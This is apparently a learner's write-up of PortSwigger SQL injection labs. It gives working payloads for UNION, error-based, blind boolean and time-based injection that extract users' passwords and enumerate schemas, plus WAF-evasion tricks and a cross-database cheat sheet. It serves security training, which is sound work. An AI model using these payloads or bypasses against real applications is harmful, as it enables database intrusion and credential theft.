# 🔐 SQL Injection — Write-up

> PortSwigger Web Security Academy  
> Topics: SQLi Manual Testing — Error-based, Union-based, Blind Boolean-based, Blind Time-based

---

## 📋 Labs Completed

| # | Lab Name | Type | Status |
|---|---|---|---|
| 1 | SQL injection UNION attack, determining the number of columns | UNION-based | ✅ |
| 2 | SQL injection UNION attack, finding a column containing text | UNION-based | ✅ |
| 3 | SQL injection UNION attack, retrieving data from other tables | UNION-based | ✅ |
| 4 | SQL injection UNION attack, retrieving multiple values in a single column | UNION-based | ✅ |
| 5 | SQL injection attack, querying the database type and version on Oracle | DB Enumeration | ✅ |
| 6 | SQL injection attack, querying the database type and version on MySQL and Microsoft | DB Enumeration | ✅ |
| 7 | SQL injection attack, listing the database contents on non-Oracle databases | DB Enumeration | ✅ |
| 8 | SQL injection attack, listing the database contents on Oracle | DB Enumeration | ✅ |
| 9 | Visible error-based SQL injection | Error-based | ✅ |
| 10 | Blind SQL injection with conditional responses | Blind Boolean-based | ✅ |
| 11 | Blind SQL injection with conditional errors | Blind Boolean-based | ✅ |
| 12 | Blind SQL injection with time delays | Blind Time-based | ✅ |
| 13 | Blind SQL injection with time delays and information retrieval | Blind Time-based | ✅ |

---

## 🧠 Core Concepts

### UNION Attack
Append an extra query to the original one and retrieve data from other tables directly in the page response.
**Requirements:** same number of columns, compatible data types.

### Error-based
Force the database to include retrieved data inside the error message itself.

### Blind Boolean-based
No data returned directly. Ask True/False questions and observe page behavior to infer data character by character.

### Blind Time-based
No visible difference in the page at all. Use deliberate delays as the True/False signal instead.

---

## 🚀 Payloads Used

### UNION — Determine number of columns
```sql
' ORDER BY 1 --
' ORDER BY 2 --
-- increment until error

' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
-- increment until no error
```

### UNION — Find text columns
```sql
' UNION SELECT 'test', NULL --
' UNION SELECT NULL, 'test' --
```

### UNION — Extract data
```sql
' UNION SELECT NULL, username, password FROM users --

-- Concatenate into one column
' UNION SELECT NULL, username || ':' || password FROM users --        (Oracle/PostgreSQL)
' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --    (MySQL)
' UNION SELECT NULL, CONCAT(username, 0x3a, password) FROM users --   (MySQL - no quotes)
```

### DB Enumeration
```sql
-- Version
' UNION SELECT NULL, @@version --              (MySQL/MSSQL)
' UNION SELECT NULL, version() --              (PostgreSQL)
' UNION SELECT NULL, banner FROM v$version --  (Oracle)

-- Tables
' UNION SELECT NULL, table_name FROM information_schema.tables --         (MySQL/PostgreSQL/MSSQL)
' UNION SELECT NULL, table_name FROM all_tables --                         (Oracle)

-- Columns
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT NULL, column_name FROM all_columns WHERE table_name='USERS' --
```

### Error-based (PostgreSQL)
```sql
' AND 1=CAST((SELECT version()) AS int) --
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --
' AND 1=CAST((SELECT password FROM users WHERE username='administrator' LIMIT 1) AS int) --
```

### Blind Boolean-based — Full Flow
```sql
-- 1. Confirm vulnerability
' AND '1'='1   →  page normal ✅
' AND '1'='2   →  page changes ❌

-- 2. Confirm table exists
' AND (SELECT 'x' FROM users LIMIT 1)='x

-- 3. Confirm user exists
' AND (SELECT 'x' FROM users WHERE username='administrator')='x

-- 4. Find password length
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)>10)='x
' AND (SELECT 'x' FROM users WHERE username='administrator' AND LENGTH(password)=20)='x

-- 5. Extract password (automate with Burp Intruder)
' AND SUBSTRING(password,1,1)='a
' AND SUBSTRING(password,2,1)='b
```

### Blind Boolean-based — Conditional Errors variant
```sql
-- Trigger error on TRUE, no error on FALSE
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a   (Oracle)
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1 --                       (MySQL/PostgreSQL)

-- Extract character
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE 1 END FROM users WHERE username='administrator')=1 --
```

### Blind Time-based — Full Flow
```sql
-- 1. Confirm vulnerability
' AND SLEEP(5) --                                           (MySQL)
'; SELECT pg_sleep(5) --                                    (PostgreSQL)
' WAITFOR DELAY '0:0:5' --                                  (MSSQL)

-- 2. Extract data using conditional delay
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') 
      THEN pg_sleep(5) ELSE pg_sleep(0) END 
      FROM users WHERE username='administrator') --          (PostgreSQL)

' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --       (MySQL)
```

---

## ❌ Mistakes I Made

### 1 — Using `||` for concatenation on MySQL
```sql
-- ❌ ' UNION SELECT NULL, username || ':' || password FROM users --
-- ✅ ' UNION SELECT NULL, CONCAT(username, ':', password) FROM users --
```
**Why:** `||` is Oracle/PostgreSQL only. MySQL requires CONCAT().

### 2 — Using `#` directly in the URL
```
-- ❌ /filter?category=Gifts' ORDER BY 1#
-- ✅ /filter?category=Gifts' ORDER BY 1%23
```
**Why:** Browser strips everything after `#`. URL-encode it as `%23`.

### 3 — Using EXTRACTVALUE on PostgreSQL
```sql
-- ❌ ' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) --
-- ✅ ' AND 1=CAST((SELECT version()) AS int) --
```
**Why:** EXTRACTVALUE is MySQL only.

### 4 — Not realizing the injection point was in the Cookie
**Why:** Burp Suite is required to modify cookies and headers manually.

### 5 — Using AND with integer instead of boolean on PostgreSQL
```sql
-- ❌ ' AND CAST((SELECT version()) AS int) --
-- ✅ ' AND 1=CAST((SELECT version()) AS int) --
```
**Why:** PostgreSQL requires boolean on both sides of AND.

### 6 — Injecting via browser for Blind SQLi
**Why:** Browser auto-encodes special characters. Always use Burp Repeater.

### 7 — Extracting password characters manually one by one
**Why:** Use Burp Intruder to automate across all positions and character sets.

---

## ⚠️ Alternative Scenarios to Watch For

### Injection point isn't in the URL
> Could be in a Cookie, User-Agent, Referer, or any custom header.  
> Always check all inputs in the request, not just URL params.

### Page looks identical for True/False (Boolean-based fails)
> Switch to Time-based — use SLEEP/pg_sleep as the signal instead.

### Single text column available (UNION)
> Concatenate multiple values into one: `CONCAT(username, ':', password)`

### Error messages are hidden
> Can't use Error-based. Fall back to Blind Boolean or Time-based.

### WAF blocking keywords
> Try case mixing (`SeLeCt`), comments (`SEL/**/ECT`), or URL encoding (`%53ELECT`).

### UNION returns wrong number of rows
> The original query might return 0 rows. Make the original condition false:  
> `?id=999 UNION SELECT NULL, username, password FROM users --`

### Time-based gives inconsistent results
> Network latency can cause false positives. Run each payload 2-3 times to confirm.

---

## 📌 Key Notes

| Topic | Note |
|---|---|
| `--` in MySQL | Needs a trailing space `-- ` or use `%23` |
| `information_schema` | All DBs except Oracle |
| Oracle | Needs `FROM DUAL` when no table required |
| LIMIT | Required with CAST — must return exactly one row |
| Burp Repeater | Always use for manual payload testing |
| Burp Intruder | Automate character-by-character Blind extraction |
| Blind indicator | Look for subtle changes — text, size, status code, delay |

---

## 🗺️ Cheat Sheet

### Comment Syntax
| MySQL | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|
| `-- ` or `#` | `--` | `--` | `--` |

### Version
| MySQL | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|
| `@@version` | `version()` | `v$version` | `@@version` |

### Concatenation
| MySQL | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|
| `CONCAT(a,b)` | `a \|\| b` | `a \|\| b` | `a + b` |

### Substring
| MySQL | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|
| `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` |

### Sleep / Delay
| MySQL | PostgreSQL | Oracle | MSSQL |
|---|---|---|---|
| `SLEEP(5)` | `pg_sleep(5)` | `dbms_pipe.receive_message('a',5)` | `WAITFOR DELAY '0:0:5'` |

### List Tables
| MySQL/PostgreSQL/MSSQL | Oracle |
|---|---|
| `information_schema.tables` | `all_tables` |

### List Columns
| MySQL/PostgreSQL/MSSQL | Oracle |
|---|---|
| `information_schema.columns` | `all_columns` |

### Error-based Technique
| MySQL | PostgreSQL | MSSQL |
|---|---|---|
| `EXTRACTVALUE(1,CONCAT(0x7e,(SELECT ...)))` | `CAST((SELECT ...) AS int)` | `CONVERT(int,(SELECT ...))` |

### Boolean Conditional
| MySQL | PostgreSQL | Oracle |
|---|---|---|
| `IF(cond, true_val, false_val)` | `CASE WHEN cond THEN a ELSE b END` | `CASE WHEN cond THEN a ELSE b END` |
